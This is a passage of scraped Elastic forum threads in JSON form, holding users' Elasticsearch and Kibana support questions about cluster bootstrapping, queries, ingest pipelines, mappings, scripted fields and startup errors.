    "title": "The confusion of configuring cluster.initial_master_nodes",
    "category": [
      "Elasticsearch"
    ],
    "author": "yc1024",
    "date": "April 22, 2020, 9:09am April 22, 2020, 12:27pm April 22, 2020, 3:05pm April 22, 2020, 4:29pm",
    "body": "Hi When I read the modules-discovery-bootstrap-cluster documentation, I found the following description When you start a master-eligible node, you can provide this setting on the command line or in the elasticsearch.yml file. After the cluster has formed, this setting is no longer required. It should not be set for master-ineligible nodes, master-eligible nodes joining an existing cluster, or cluster restarts. What happens if I configure the cluster.initial_master_nodes parameter on master-ineligible nodes, master-eligible nodes joining an existing cluster, or cluster restarts?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "73c0db9a-84d8-44ce-995d-2327c10102cf",
    "url": "https://discuss.elastic.co/t/how-to-convert-a-date-to-string-using-local-time/229038",
    "title": "How to convert a date to string using local time",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 21, 2020, 12:49pm April 22, 2020, 4:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "dba3d580-da6a-4286-a9c0-a78353468161",
    "url": "https://discuss.elastic.co/t/watcher-alerts-to-multiple-users/229241",
    "title": "Watcher Alerts to multiple users",
    "category": [
      "Elasticsearch"
    ],
    "author": "spike83",
    "date": "April 22, 2020, 11:21am April 22, 2020, 11:34am April 22, 2020, 11:49am April 22, 2020, 4:14pm",
    "body": "Hi, Is it possible to configure watcher alerts to email users based on a role? If not, I dont have a distribution list so would like to be able to added and remove users form all watcher alerts without having to go through and edit them all individually. Is this possible?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4f4c3a50-dcff-4fdc-80b0-04fdd3012547",
    "url": "https://discuss.elastic.co/t/index-where-its-documents-represent-the-settings-of-other-indexes/229310",
    "title": "Index where its documents represent the settings of other indexes",
    "category": [
      "Elasticsearch"
    ],
    "author": "d864",
    "date": "April 22, 2020, 4:11pm",
    "body": "Hi everyone, I'm new with elasticsearch and I want to ask you a technical question. I am creating a rest APIs to manage n indexes where each of them contain a list of documents. I am ignoring the type because I have read that type won't be supported from elasticsearch 8.0.0 anymore. My question is: could it be useful to create an index where its documents are the setting of other indexes (one document would represent the settings of one index)? Otherwise what could be the best way to manage a set of indexes (from a RESTful point of view)? Thank you.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "159c59b3-760e-488d-98e0-1ee976d388ad",
    "url": "https://discuss.elastic.co/t/x-axis-time-shifts-between-kibana-and-elasticsearch/229306",
    "title": "X-Axis Time Shifts Between Kibana and Elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "gtdkibana",
    "date": "April 22, 2020, 4:02pm",
    "body": "Hello. Below is the results of an elasticsearch. Note the query, and the time range. The bars come in roughly 4 clusters. Note also the x-axis and the @timestamps per 5 minutes. image1876×506 83.7 KB Now, for values in the elastic search entries, I wanted to create a graph of values over time. I used the datehistogram and selected an aggregate function for the value I wanted to plot. Below is the results. image1876×1023 109 KB The query is exactly the same, the time range is exactly the same. @timestamp per 5 minutes is the same for both results. But, curiously, the x-axis for the graph has been shifted. In fact the x-axis does not display the specified time range. And yet, the depicted looks the same. There's about 4 cluster of bars for the elastic search results, and for the graph. The question is, why is the time not being displayed on the graph? Why is it out of bounds with the specified time range? How do I correct it. Note, it doesn't seem to matter what aggregate function I use or how big the time bucket is used, the X-axis displayed for the date histogram never displays the specified date range. I also playing around with time bucket truncation hasn't worked, either. I changed the graph to use count, just to verify the relative heights of the bars look the same and it does check out. Notice that the x-axis is still shifted and out of range of query specification. image1876×1063 123 KB Anyways, any help, insights, or things to try out would be greatly appreciated. Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "38bd17ad-8921-4781-a6f9-d1d80d40779e",
    "url": "https://discuss.elastic.co/t/elasticsearch-indexing-based-on-data-input/228795",
    "title": "Elasticsearch Indexing based on data input",
    "category": [
      "Elasticsearch"
    ],
    "author": "rampoq",
    "date": "April 20, 2020, 6:30am April 20, 2020, 6:42am April 20, 2020, 10:25am April 20, 2020, 10:50am April 22, 2020, 4:00pm April 22, 2020, 4:01pm",
    "body": "I wish to push documents in Json format and wish to update it based on the input data, to be specifiv like unique identifier present in data, ( if that unique identifier value is already present in indexed data, it should update the existing data with the upcoming updated data and if the data is not there then it should be inserted into the index ), i wish to customize the _id metadata field is that possible in elasticsearch or do i have to customize anything for that",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "3cd2195c-a403-4d76-b132-e490ee242b8e",
    "url": "https://discuss.elastic.co/t/extending-storage-of-elasticsearch/229307",
    "title": "Extending storage of elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "RAM_NATHAN",
    "date": "April 22, 2020, 3:57pm",
    "body": "Hi Assume I have a storage size of 100 GB and it got filled up almost. Then I wish to extend the storage with external hard drive. Can I visualize both existing and external storage data in Kibana, means can I ask Kibana point to two storage locations?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "fcab3f98-eac8-4529-b922-8d23b8f6c12e",
    "url": "https://discuss.elastic.co/t/fscrawler-production-support-available/229277",
    "title": "FScrawler: Production Support Available?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Yamini_Shashank",
    "date": "April 22, 2020, 1:58pm April 22, 2020, 3:44pm",
    "body": "Does elasticsearch provide production support for fscrawler?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3446166f-5a77-483f-b036-2346f8e78700",
    "url": "https://discuss.elastic.co/t/nested-path-with-inner-hits-and-complex-logical-operations/229300",
    "title": "Nested path with inner_hits and complex logical operations",
    "category": [
      "Elasticsearch"
    ],
    "author": "jo_dev",
    "date": "April 22, 2020, 3:20pm",
    "body": "I have document with following nested mapping -> A -> B -> C While querying with following expression with inner_hits to get matching part of the document -> ((A.B.field1 == 1) AND (A.B.C.field2 == \"Foo\")) OR ((A.B.field1 == 3) AND (A.B.C.field2 == \"Bar\")) \"query\": { \"bool\": { \"filter\": { \"nested\": { \"inner_hits\": {}, \"path\": \"A\", \"query\": { \"bool\": { \"filter\": { \"nested\": { \"inner_hits\": {}, \"path\": \"B\", \"query\": { \"bool\": { \"minimum_should_match\": 1, \"should\": [ { \"bool\": { \"must\":[ { { \"bool\": { \"must\": [\"bool\": {\"filter\": [\"match\": {A.B.field1: 1}]}]} }, { \"bool\": { \"filter\": [{\"nested\": {\"path\": \"A.B.C\", inner_hits:{\"name\":\"A.B.C.1\"},\"query\": {\"match\":{A.B.C.field2: \"Foo\"}}}}]} } } ] } }, { \"bool\": { \"must\":[ { { \"bool\": { \"must\": [\"bool\": {\"filter\": [\"match\": {A.B.field1: 3}]}]} }, { \"bool\": { \"filter\": [{\"nested\": {\"path\": \"A.B.C\", inner_hits:{\"name\":\"A.B.C.2\"},\"query\": {\"match\":{A.B.C.field2: \"Bar\"}}}}]} } } ] } }, ] } } } } } } } } } } } This returns response with inner_hits matching conditions A.B.C.field2 == \"Foo\" and A.B.C.field2 == \"Bar\" individually, i.e. without considering other conditions in the logical expression. I need a programatic way to process the response to join the matching pieces (i.e. matching pieces for each of the nesting level). But, because inner_hits \"A.B.C.1\" and \"A.B.C.2\" contains information which doesn't always fulfil the entire matching criteria, it is non-trivial to decide which inner_hit to consider. Is there anyway to for all the inner_hits to include part of the document which matches entire logical expression? (matching part of that nesting level, and entire sub-nesting below as is) This used to be the behaviour in some of the older versions without fix for https://github.com/elastic/elasticsearch/pull/37645 This used to work say in 6.6.0, but not working in 6.7.1 onwards...",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7eea1607-898e-497a-8457-2863a50a6c6f",
    "url": "https://discuss.elastic.co/t/uploading-license-file/229136",
    "title": "Uploading license file",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 21, 2020, 10:18pm April 21, 2020, 10:18pm April 22, 2020, 3:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "86993c3e-ff2d-43bd-8fb9-d8686099fc16",
    "url": "https://discuss.elastic.co/t/beats-data-not-enriching-when-using-logstash-elastic-output-plugin/229283",
    "title": "Beats Data not enriching when using Logstash + Elastic output plugin",
    "category": [
      "Elasticsearch"
    ],
    "author": "mgevans",
    "date": "April 22, 2020, 3:03pm",
    "body": "Hi Folks, This is a fairly basic question so i'm sure i'm missing something straightforward. We are using out of the box everything in a brand new POC environment. I have created an enrichment policy and associated pipeline that works great when i run data through the ingest node locally in Elasticsearch (via dev console). *pipeline details below Example of success with enrichment pipeline POST metricbeat-7.6.2-2020.04.13/_update_by_query?pipeline=pipeline_appcmdb_host_application&wait_for_completion=false Works great! I can see our enrichment data fields populated based on the matching fields POST metricbeat-7.6.2-2020.04.21/_doc?pipeline=pipeline_appcmdb_host_application {doc data here} This also works just fine. We have beats 7.6.x running and sending to Logstash. Logstash in turn sends to Elastic via the Elasticsearch Output Plugin (https://www.elastic.co/guide/en/logstash/current/plugins-outputs-elasticsearch.html#plugins-outputs-elasticsearch-pipeline) I'm trying to put our logstash sent data through the same pipeline but we are not getting any enrichment. The tag associated with the pipeline is not being added either suggesting it isn't even trying the pipeline. here is our Logstash pipeline definition which includes the Elasticsearch plugin with the target pipeline defined. # MonitorDevPipe-1 Logstash configuration # Beats -> Logstash -> Elasticsearch pipeline. input { beats { port => 5044 } } output { elasticsearch { hosts => [\"http://gtselkdev01:9200\"] index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" pipeline => \"pipeline_appcmdb_host_application\" } } Thanks for any help! Michael pipeline details PUT _ingest/pipeline/pipeline_appcmdb_host_application { \"description\" : \"adds application name to incoming beats data based on beats agent host name\", \"processors\" : [ { \"enrich\": { \"policy_name\": \"enrich_appcmdb_host_application\", \"field\": \"host.hostname\", \"target_field\": \"appcmdb_application\", \"ignore_missing\": true, \"tag\": \"enrich_appcmdb_host_application\" } } ] }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "57b85d9d-0ae4-4443-84d1-6d0571317789",
    "url": "https://discuss.elastic.co/t/cant-hit-api-on-non-loopback-ip/229048",
    "title": "Can't hit API on non-loopback IP",
    "category": [
      "Elasticsearch"
    ],
    "author": "hmcguire",
    "date": "April 21, 2020, 1:18pm April 21, 2020, 1:44pm April 21, 2020, 1:49pm April 21, 2020, 1:53pm April 21, 2020, 1:54pm April 21, 2020, 1:59pm April 21, 2020, 1:59pm April 21, 2020, 2:11pm April 21, 2020, 2:15pm April 21, 2020, 2:31pm April 21, 2020, 2:33pm April 21, 2020, 2:34pm April 21, 2020, 2:37pm April 21, 2020, 2:51pm April 21, 2020, 2:53pm April 21, 2020, 3:16pm April 21, 2020, 3:31pm April 21, 2020, 5:30pm April 21, 2020, 5:54pm April 21, 2020, 6:30pm",
    "body": "I have just setup a new dev 7.6.2 single-node cluster via rpm on centos 7 and am unable to curl the API on the non-loopback address. Curl to localhost works fine and I can also telnet to the default port of 9200 of the non-loopback address from another host. I have tried many different variations for network host including special site, ip addr, 0.0.0.0, and 0. This is a POC so I am not trying to configure very much beyond defaults. I have no issues with the service starting in regards to the bootstrap checks for single node cluster. Any help would be much appreciated. Relevant elasticsearch.yml network/http settings I have explicitly set in file: network.host: 0 http.port: 9200",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "a86b8fca-044d-4e04-9ad5-f1694f613924",
    "url": "https://discuss.elastic.co/t/query-multi-index-using-java-api/229278",
    "title": "Query multi index using Java API",
    "category": [
      "Elasticsearch"
    ],
    "author": "Khanh_Nguy_n1",
    "date": "April 22, 2020, 2:18pm",
    "body": "Hi, I am trying to query on multiple indices using Java API. The wildcard expression is passed to the request like this String[] indices = client.indices().get(new GetIndexRequest().indices(\"prefix_*\"), RequestOptions.DEFAULT).indices(); SearchRequest searchRequest = new SearchRequest(); searchRequest.indices(indices); but as this wildcard term expanded to a relatively large number of index (over 1000), it returned this error: {\"error\":{\"root_cause\":[{\"type\":\"too_long_frame_exception\",\"reason\":\"An HTTP line is larger than 4096 bytes.\"}],\"type\":\"too_long_frame_exception\",\"reason\":\"An HTTP line is larger than 4096 bytes.\"},\"status\":400} When using kibana, it works perfectly as expected. GET prefix_*/_search How could it be done through Java API? I have been looking for proper solution from Java documentation but not found any. Thanks in advance.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "dc8cd6f4-fa88-477b-9074-94ba521c08da",
    "url": "https://discuss.elastic.co/t/using-logical-and-query-in-kibana/229276",
    "title": "Using logical AND query in Kibana",
    "category": [
      "Elasticsearch"
    ],
    "author": "adiksl",
    "date": "April 22, 2020, 1:55pm",
    "body": "I am trying to implement a simple query in Kibana and then in C# NEST. I am from a SQL background and am struggling to find documentation to perform a relatively simple SQL query in Elasticsearch. The query I am trying to implement is effectively...... SELECT * FROM table WHERE logdate > STR_TO_DATE('2020-02-01 23:59:59','%Y-%m-%d %H:%i:%s') AND logdate < STR_TO_DATE('2020-02-03 00:00:00','%Y-%m-%d %H:%i:%s') AND username = 'user01' I can do them as individual kibana queries.... GET table/_search { \"query\": { \"range\": { \"logdate\": { \"gt\": \"2020-02-01T23:59:59\", \"lt\": \"2020-02-03T00:00:00\" } } } } GET table/_search { \"query\": { \"match\": { \"username\": \"user01\" } } } But when I try and combine them into one query I get a \"parsing_exception\" error... GET table/_search { \"query\" : { \"bool\" : { \"must\": [ { \"match\": { \"username\": \"user01\" }, \"range\": { \"logdate\": { \"gt\": \"2020-02-01T23:59:59\", \"lt\": \"2020-02-03T00:00:00\" } } } ] } } } I have looked at the Elasticsearch documentation and can't seem to find the answer so any help would be appreciated, thanks in advance",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8c9274a7-634d-4ec5-8840-8aa895a39e7d",
    "url": "https://discuss.elastic.co/t/elasticsearch-service-on-azure-cloud-vs-elasticsearch-service-on-elastic-cloud/229271",
    "title": "Elasticsearch Service on Azure cloud vs Elasticsearch Service on Elastic cloud",
    "category": [
      "Elasticsearch"
    ],
    "author": "Alexandros888",
    "date": "April 22, 2020, 1:44pm",
    "body": "Hello, Can someone please explain me whats the pros and cons of using ELK as a service on Azure cloud vs using ELK as a service on Elastic cloud? And as an additional question, is logstash also going to be part of the elastic cloud as a service or azure cloud as a service any time soon? Thank you.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b9ecba93-e722-46d4-9027-632db50e92b5",
    "url": "https://discuss.elastic.co/t/get-ssl-certificate/229273",
    "title": "Get SSL certificate",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rajeev_Bhat",
    "date": "April 22, 2020, 1:40pm",
    "body": "Hello, I have executed \"GET /_ssl/certificates\" in elastic cloud-kibana dev tools , as a result generated certificate is stored in \"path\" : \"node.crt\". But I couldn't able to view the file node.crt, where should I see in elastic cloud website?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8d7f1046-c72e-4b21-84ac-4505bfb68494",
    "url": "https://discuss.elastic.co/t/segment-merging-on-old-indices/229272",
    "title": "Segment merging on old indices",
    "category": [
      "Elasticsearch"
    ],
    "author": "YvorL",
    "date": "April 22, 2020, 1:37pm",
    "body": "Hi, I've got a lot of daily indices and I'm not sure if Elasticsearch will perform any write actions on indices that aren't getting any new documents or updates, does it do anything like that? Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ae27cae4-573f-4943-a138-77f7c549ee6f",
    "url": "https://discuss.elastic.co/t/failed-to-put-mappings-on-indices-type-string-java-lang-illegalargumentexception-rejecting-mapping-update-to-as-the-final-mapping-would-have-more-than-1-type-doc-string/229226",
    "title": "Failed to put mappings on indices [[[]]], type [string] java.lang.IllegalArgumentException: Rejecting mapping update to [] as the final mapping would have more than 1 type: [_doc, string]",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jacques_van_der_Merw",
    "date": "April 22, 2020, 1:15pm April 22, 2020, 11:25am April 22, 2020, 1:14pm",
    "body": "I am getting this error only when I define an Index template on Kibana. I define an index template in order to define a lifecylce policy. The error is \" failed to put mappings on indices [[]], type [string] java.lang.IllegalArgumentException: Rejecting mapping update to as the final mapping would have more than 1 type: [_doc, string]\" The index is auto created when first index is created, but as soon as the the data is loaded this error is thrown. I use Java Springboot to push the events to Elastic. Here is extract of code > private void sendToElasticSearch(WMQIStatisticsAccounting event) { > String stringOut = \"\"; > // Local date time instance > LocalDateTime localDateTime = LocalDateTime.now(); > > // Get formatted String > String ldtString = localDateTime.format(indexDateFormatter); > String elasticIndexName = indexName + \"_\" + ldtString; > > ObjectMapper objectMapper = new ObjectMapper(); > WMQIStatisticsAccounting eventOut = setEventOut(event); > > try { > stringOut = objectMapper.writeValueAsString(eventOut); > } catch (JsonProcessingException e2) { > e2.printStackTrace(); > } > > try { > GetIndexRequest idexRequest = new GetIndexRequest(); > idexRequest.indices(elasticIndexName); > > IndexRequest request = new IndexRequest(elasticIndexName); > request.create(true); > request.id(UUID.randomUUID().toString()); > request.type(\"string\"); > request.opType(DocWriteRequest.OpType.CREATE); > request.source(stringOut, XContentType.JSON); > client.index(request, RequestOptions.DEFAULT); > log.info(\"Id : \" + request.id()); > } catch (Exception e) { > throw new RuntimeException(\"Unable to push event to Elastic : \" + e.getMessage()); > } > } I have read through all the previous comments that relates to this error and none are applicable.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c9407d47-ce05-4f71-9f8d-dd8a0767d92b",
    "url": "https://discuss.elastic.co/t/disk-capacity/229224",
    "title": "Disk Capacity",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 9:55am April 22, 2020, 9:57am April 22, 2020, 9:59am April 22, 2020, 10:02am April 22, 2020, 10:03am April 22, 2020, 10:11am April 22, 2020, 10:27am April 22, 2020, 1:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "3e60ac40-4c79-4d28-bf8a-83439824482e",
    "url": "https://discuss.elastic.co/t/getting-exception-while-starting-the-elastic-search-node/229263",
    "title": "Getting exception while starting the elastic search node",
    "category": [
      "Elasticsearch"
    ],
    "author": "DENMODSupport",
    "date": "April 22, 2020, 12:48pm",
    "body": "We are getting below exception while starting one of the elastic search nodes. [2020-04-20T15:22:16,743][ERROR][o.e.g.GatewayMetaState ] [elk-denmod-web-2] failed to read local state, exiting... **java.lang.IllegalStateException: index and alias names need to be unique, but alias [denmod_y_3698] and index [denmod_y_3698/g8fYmCo_QYaJKCdcdXONOQ] have the same name** at org.elasticsearch.cluster.metadata.MetaData$Builder.build(MetaData.java:1034) ~[elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.gateway.MetaStateService.loadFullState(MetaStateService.java:73) ~[elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.gateway.GatewayMetaState.<init>(GatewayMetaState.java:88) [elasticsearch-5.3.1.jar:5.3.1] at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:?] at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) [?:1.8.0_131] at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) [?:1.8.0_131] at java.lang.reflect.Constructor.newInstance(Constructor.java:423) [?:1.8.0_131] at org.elasticsearch.common.inject.DefaultConstructionProxyFactory$1.newInstance(DefaultConstructionProxyFactory.java:49) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ConstructorInjector.construct(ConstructorInjector.java:86) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ConstructorBindingImpl$Factory.get(ConstructorBindingImpl.java:116) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ProviderToInternalFactoryAdapter$1.call(ProviderToInternalFactoryAdapter.java:47) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorImpl.callInContext(InjectorImpl.java:825) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ProviderToInternalFactoryAdapter.get(ProviderToInternalFactoryAdapter.java:43) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.Scopes$1$1.get(Scopes.java:59) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InternalFactoryToProviderAdapter.get(InternalFactoryToProviderAdapter.java:50) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.SingleParameterInjector.inject(SingleParameterInjector.java:42) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.SingleParameterInjector.getAll(SingleParameterInjector.java:66) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ConstructorInjector.construct(ConstructorInjector.java:85) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ConstructorBindingImpl$Factory.get(ConstructorBindingImpl.java:116) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ProviderToInternalFactoryAdapter$1.call(ProviderToInternalFactoryAdapter.java:47) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorImpl.callInContext(InjectorImpl.java:825) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ProviderToInternalFactoryAdapter.get(ProviderToInternalFactoryAdapter.java:43) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.Scopes$1$1.get(Scopes.java:59) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InternalFactoryToProviderAdapter.get(InternalFactoryToProviderAdapter.java:50) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorBuilder$1.call(InjectorBuilder.java:191) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorBuilder$1.call(InjectorBuilder.java:183) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorImpl.callInContext(InjectorImpl.java:818) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorBuilder.loadEagerSingletons(InjectorBuilder.java:183) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorBuilder.loadEagerSingletons(InjectorBuilder.java:173) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorBuilder.injectDynamically(InjectorBuilder.java:161) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.InjectorBuilder.build(InjectorBuilder.java:96) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.Guice.createInjector(Guice.java:96) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.Guice.createInjector(Guice.java:70) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.common.inject.ModulesBuilder.createInjector(ModulesBuilder.java:43) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.node.Node.<init>(Node.java:489) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.node.Node.<init>(Node.java:242) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Bootstrap$6.<init>(Bootstrap.java:242) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:242) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:360) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:123) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:114) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:58) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:122) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.cli.Command.main(Command.java:88) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:91) [elasticsearch-5.3.1.jar:5.3.1] at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:84) [elasticsearch-5.3.1.jar:5.3.1] is there any way to start that elastic search node without losing any data?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "b775c00b-464b-4d10-9d86-e1e76cc7f35c",
    "url": "https://discuss.elastic.co/t/reusing-scripted-field-in-another-scripted-field-as-a-parameter-in-painless/229258",
    "title": "Reusing scripted field in another scripted field as a parameter in painless",
    "category": [
      "Elasticsearch"
    ],
    "author": "anoymous_cooper",
    "date": "April 22, 2020, 12:40pm",
    "body": "I am trying to use a scripted field as a parameter in another scripted field but it seems to give wrong result in es7.4.2,It was working fine in es5.0.1 \"script_fields\": { \"a\": { \"script\": { \"source\": \"return 1\", \"lang\": \"painless\" }, \"ignore_failure\": false }, \"b\": { \"script\": { \"source\": \"if(params.val != null){return params.val}\", \"lang\": \"painless\", \"params\": { \"val\":\"a\" } }, \"ignore_failure\": false } expected output -> value of field \"a\" is \"1\" and \"b\" is also \"1\" but actual result ->value of field \"a\" is 1 and \"b\" is \"a\" can anyone tell me what is wrong with the query",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c3a950f2-4fdc-430b-b473-da33658a14f7",
    "url": "https://discuss.elastic.co/t/upsert-cant-work/229235",
    "title": "Upsert cant work?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Olivia5",
    "date": "April 22, 2020, 12:04pm",
    "body": "(topic withdrawn by author, will be automatically deleted in 24 hours unless flagged)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "add6e863-3ba7-4292-81ee-b7b4a5bfbd48",
    "url": "https://discuss.elastic.co/t/cant-get-nested-value-on-script/229251",
    "title": "Can't get nested value on script",
    "category": [
      "Elasticsearch"
    ],
    "author": "joel.ortin",
    "date": "April 22, 2020, 11:56am",
    "body": "Hi, I'm trying to do some sorting functionality (like multiply a calculated distance by a number). I have a nested relation where i have multiple objects with a geopoint, and I want to get the closest one and sort the root document by that. But any time I try to get the field on the script, It doesn't exist. Elasticsearch version 7.1 Right now I'm just trying to return the closest object but it acts like there is no value (always return 0, and the result return that stores has values): Script: POST _scripts/distance-popularity-sort { \"script\": { \"lang\": \"painless\", \"source\": \"if ( doc['stores.location'].size() == 0) return 0; return doc['stores.location'].arcDistance(params.latitude, params.longitude)\" } } Get query: { \"script_fields\":{ \"sort_value\":{ \"script\":{ \"id\":\"distance-popularity-sort\", \"params\":{ \"latitude\":40.416690826416016, \"location\":\"stores.location\", \"longitude\":-3.700345516204834 } }, \"ignore_failure\":false } }, \"sort\":[ { \"_script\":{ \"script\":{ \"id\":\"distance-popularity-sort\", \"params\":{ \"latitude\":40.416690826416016, \"location\":\"stores.location\", \"longitude\":-3.700345516204834 } }, \"type\":\"number\", \"order\":\"desc\" } } ], \"_source\":{ \"includes\":[ \"id\", \"stores\" ] } } Thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6e3ded4c-dcb5-42c6-9bec-27ab2922f96f",
    "url": "https://discuss.elastic.co/t/how-to-speedup-snapshot-backup-to-s3/229249",
    "title": "How to speedup snapshot backup to s3?",
    "category": [
      "Elasticsearch"
    ],
    "author": "nchalise",
    "date": "April 22, 2020, 11:49am",
    "body": "Is there any method or configuration to speed up the index snapshot backup to s3.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "95310f33-3e1f-4754-b0cd-9b312db34bea",
    "url": "https://discuss.elastic.co/t/co-elastic-apm-agent-impl-async-spaninscoperunnablewrapper-run-spaninscoperunnablewrapper-java-64/229248",
    "title": "co.elastic.apm.agent.impl.async.SpanInScopeRunnableWrapper.run(SpanInScopeRunnableWrapper.java:64)",
    "category": [
      "Elasticsearch"
    ],
    "author": "raja_shekar",
    "date": "April 22, 2020, 11:44am",
    "body": "Hi All, At what cases are we get the \"co.elastic.apm.agent.impl.async.SpanInScopeRunnableWrapper.run(SpanInScopeRunnableWrapper.java:64)\" exception: An error has occurred during your search. Please log out, log back in and try your search again message: 2020-04-21T12:46:56.698Z [http-apr-8080-exec-17 ERROR c.o.d.d.w.u.ExceptionHandlerAdvice:-1 - Search Error. at org.springframework.web.context.request.async.WebAsyncManager$5.run(WebAsyncManager.java:327) at co.elastic.apm.agent.impl.async.SpanInScopeRunnableWrapper.run(SpanInScopeRunnableWrapper.java:64) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4e238970-f5a0-444b-a8b1-21e35104a6fc",
    "url": "https://discuss.elastic.co/t/error-could-not-index-event-to-elasticsearch/229240",
    "title": "Error: Could not index event to Elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "thywoe",
    "date": "April 22, 2020, 11:18am April 22, 2020, 11:34am",
    "body": "Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"rencore-2020.04.22\", :routing=>nil, :_type=>\"_doc\"}, #<LogStash::Event:0x6325d5c0>], :response=>{\"index\"=>{\"_index\"=>\"rencore-2020.04.22\", \"_type\"=>\"_doc\", \"_id\"=>\"1NqFoXEBtOBq7OZs9Lnh\", \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"failed to parse field [response] of type [text] in document with id '1NqFoXEBtOBq7OZs9Lnh' I have two different log patterns in my log file and the \"response\" field in string in one and object in the other log pattern. Please I need help. Thanks",
